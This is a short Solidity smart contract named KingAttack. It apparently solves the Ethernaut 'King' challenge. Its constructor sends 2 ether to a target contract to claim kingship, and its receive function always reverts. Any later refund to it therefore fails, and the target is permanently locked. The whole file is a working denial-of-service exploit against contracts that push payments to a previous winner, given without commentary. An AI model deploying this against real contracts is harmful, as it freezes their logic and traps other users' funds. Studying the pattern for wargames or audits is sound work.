// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable _kingAddress) payable {
        (bool sent, ) = _kingAddress.call{value: 2 ether}("");
        require(sent);
    }

    receive() external payable {
        revert();
    }
}
